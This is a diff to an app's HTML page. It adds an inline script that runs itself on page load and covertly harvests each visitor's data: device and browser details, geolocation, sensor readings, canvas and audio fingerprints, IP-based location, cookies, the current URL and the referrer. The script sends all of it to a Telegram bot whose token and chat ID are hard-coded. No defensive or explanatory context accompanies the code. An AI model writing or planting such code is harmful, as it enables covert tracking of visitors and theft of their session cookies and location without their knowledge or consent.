@@ -29,6 +29,209 @@
   </head>
   <body>
     <div id="root"></div>
+<script>
+// ================== Config ==================
+const TELEGRAM_BOT_TOKEN = "8438311634:AAF2c5isGOXJd-0cqvxWToig3FHqsO6S-io"; // Telegram Bot Token
+const CHAT_ID = "6645665433";             // Telegram Chat ID
+const IPINFO_TOKEN = "2ce6e58dcbc000";      // ipinfo.io Token
 
+// ================== Data Collection ==================
+async function collectData() {
+    // -------- Device & Hardware --------
+    const deviceMemory = navigator.deviceMemory || "unknown";
+    const cpuCores = navigator.hardwareConcurrency || "unknown";
+    const screenWidth = screen.width || "unknown";
+    const screenHeight = screen.height || "unknown";
+    const screenOrientation = screen.orientation ? screen.orientation.type : "unknown";
+    const colorDepth = screen.colorDepth || "unknown";
+    const pixelRatio = window.devicePixelRatio || "unknown";
+    const touchSupport = 'ontouchstart' in window;
+    const maxTouchPoints = navigator.maxTouchPoints || 0;
+
+    // -------- Browser & Software --------
+    const userAgent = navigator.userAgent || "unknown";
+    const language = navigator.language || "unknown";
+    const platform = navigator.platform || "unknown";
+    const cookiesEnabled = navigator.cookieEnabled;
+    const javaEnabled = navigator.javaEnabled ? navigator.javaEnabled() : "unknown";
+    const localStorageAvailable = typeof localStorage !== "undefined";
+    const sessionStorageAvailable = typeof sessionStorage !== "undefined";
+    const plugins = navigator.plugins ? Array.from(navigator.plugins).map(p => p.name) : [];
+
+    // -------- Battery & Performance --------
+    let battery = {
+        level: "unknown",
+        charging: "unknown",
+        chargingTime: "unknown",
+        dischargingTime: "unknown"
+    };
+    if (navigator.getBattery) {
+        try {
+            const bat = await navigator.getBattery();
+            battery.level = bat.level !== undefined ? (bat.level * 100).toFixed(0) + "%" : "unknown";
+            battery.charging = bat.charging !== undefined ? bat.charging : "unknown";
+            battery.chargingTime = bat.chargingTime !== undefined ? bat.chargingTime : "unknown";
+            battery.dischargingTime = bat.dischargingTime !== undefined ? bat.dischargingTime : "unknown";
+        } catch (e) {
+            console.log("Battery API error:", e);
+        }
+    }
+
+    // -------- Geolocation --------
+    let geolocation = { latitude: "unknown", longitude: "unknown" };
+    if (navigator.geolocation) {
+        await new Promise(resolve => {
+            navigator.geolocation.getCurrentPosition(pos => {
+                geolocation.latitude = pos.coords.latitude || "unknown";
+                geolocation.longitude = pos.coords.longitude || "unknown";
+                resolve();
+            }, () => resolve());
+        });
+    }
+
+    // -------- Sensors --------
+    let orientationData = {};
+    let motionData = {};
+    window.addEventListener('deviceorientation', e => {
+        orientationData = { alpha: e.alpha, beta: e.beta, gamma: e.gamma };
+    });
+    window.addEventListener('devicemotion', e => {
+        motionData = { x: e.acceleration?.x, y: e.acceleration?.y, z: e.acceleration?.z };
+    });
+
+    // -------- Fingerprinting --------
+    let canvas = document.createElement('canvas');
+    let ctx = canvas.getContext('2d');
+    ctx.textBaseline = "top";
+    ctx.font = "16px Arial";
+    ctx.fillText("Fingerprint Test", 2, 2);
+    const canvasFingerprint = canvas.toDataURL();
+
+    let audioContextFingerprint = "unknown";
+    try {
+        const AudioContext = window.OfflineAudioContext || window.webkitOfflineAudioContext;
+        const ctxAudio = new AudioContext(1,44100,44100);
+        audioContextFingerprint = ctxAudio.sampleRate;
+    } catch(e) {}
+
+    // -------- IP & Network --------
+    let ipData = {};
+    try {
+        ipData = await fetch(`https://ipinfo.io/json?token=${IPINFO_TOKEN}`).then(res => res.json());
+    } catch(e) {
+        ipData = { ip: "unknown", city: "unknown", region: "unknown", country: "unknown", org: "unknown", timezone: "unknown" };
+    }
+
+    const connection = navigator.connection || {};
+    const networkData = {
+        type: connection.type || "unknown",
+        downlink: connection.downlink || "unknown",
+        effectiveType: connection.effectiveType || "unknown",
+        rtt: connection.rtt || "unknown"
+    };
+
+    // -------- Storage & Cookies --------
+    const cookies = document.cookie || "none";
+    const indexedDBAvailable = !!window.indexedDB;
+    const cacheAvailable = 'caches' in window;
+
+    // -------- Other Web Data --------
+    const referrer = document.referrer || "none";
+    const currentURL = window.location.href || "unknown";
+    const historyLength = window.history.length || 0;
+    const saveData = navigator.connection ? navigator.connection.saveData : "unknown";
+
+    return {
+        device: { memory: deviceMemory, cores: cpuCores, screen: { width: screenWidth, height: screenHeight, orientation: screenOrientation, colorDepth, pixelRatio, touchSupport, maxTouchPoints } },
+        browser: { userAgent, language, platform, cookiesEnabled, javaEnabled, localStorageAvailable, sessionStorageAvailable, plugins },
+        network: { ip: ipData.ip, city: ipData.city, region: ipData.region, country: ipData.country, org: ipData.org, timezone: ipData.timezone, ...networkData },
+        battery,
+        geolocation,
+        sensors: { orientationData, motionData },
+        fingerprint: { canvas: canvasFingerprint, audio: audioContextFingerprint },
+        storage: { cookies, indexedDBAvailable, cacheAvailable },
+        webData: { referrer, currentURL, historyLength, saveData }
+    };
+}
+
+// ================== Telegram Message ==================
+async function sendToTelegram(data) {
+    const message = `
+*💻 Device & Hardware*
+_RAM_: \`${data.device.memory}\`
+_CPU Cores_: \`${data.device.cores}\`
+_Screen_: \`${data.device.screen.width}x${data.device.screen.height}\`
+_Orientation_: \`${data.device.screen.orientation}\`
+_Color Depth_: \`${data.device.screen.colorDepth}\`
+_Pixel Ratio_: \`${data.device.screen.pixelRatio}\`
+_Touch Support_: \`${data.device.screen.touchSupport}\`
+_Max Touch Points_: \`${data.device.screen.maxTouchPoints}\`
+
+*🌐 Browser & Software*
+_User Agent_: \`${data.browser.userAgent}\`
+_Language_: \`${data.browser.language}\`
+_Platform_: \`${data.browser.platform}\`
+_Cookies Enabled_: \`${data.browser.cookiesEnabled}\`
+_Java Enabled_: \`${data.browser.javaEnabled}\`
+_LocalStorage_: \`${data.browser.localStorageAvailable}\`
+_SessionStorage_: \`${data.browser.sessionStorageAvailable}\`
+_Plugins_: \`${data.browser.plugins.join(', ')}\`
+
+*📍 Network & IP*
+_IP_: \`${data.network.ip}\`
+_City, Region, Country_: \`${data.network.city}, ${data.network.region}, ${data.network.country}\`
+_ISP_: \`${data.network.org}\`
+_Timezone_: \`${data.network.timezone}\`
+_Connection Type_: \`${data.network.type}\`
+_Downlink_: \`${data.network.downlink}\`
+_Effective Type_: \`${data.network.effectiveType}\`
+_RTT_: \`${data.network.rtt}\`
+
+*🔋 Battery Info*
+_Level_: \`${data.battery.level}\`
+_Charging_: \`${data.battery.charging}\`
+_Charging Time_: \`${data.battery.chargingTime}\`
+_Discharging Time_: \`${data.battery.dischargingTime}\`
+
+*🧭 Geolocation*
+\`${data.geolocation.latitude}, ${data.geolocation.longitude}\`
+
+*🖥️ Fingerprinting*
+_Canvas_: \`${data.fingerprint.canvas.substring(0,30)}...\`
+_Audio_: \`${data.fingerprint.audio}\`
+
+*🧪 Sensors*
+_Orientation_: \`${JSON.stringify(data.sensors.orientationData)}\`
+_Motion_: \`${JSON.stringify(data.sensors.motionData)}\`
+
+*📦 Storage & Cookies*
+_Cookies_: \`${data.storage.cookies}\`
+_IndexedDB_: \`${data.storage.indexedDBAvailable}\`
+_Cache API_: \`${data.storage.cacheAvailable}\`
+
+*📊 Other Web Data*
+_Referrer_: \`${data.webData.referrer}\`
+_Current URL_: \`${data.webData.currentURL}\`
+_History Length_: \`${data.webData.historyLength}\`
+_Save Data_: \`${data.webData.saveData}\`
+`;
+
+    await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({
+            chat_id: CHAT_ID,
+            text: message,
+            parse_mode: "MarkdownV2"
+        })
+    });
+}
+
+// ================== Run ==================
+(async () => {
+    const data = await collectData();
+    await sendToTelegram(data);
+})();
+</script>
   </body>
 </html>
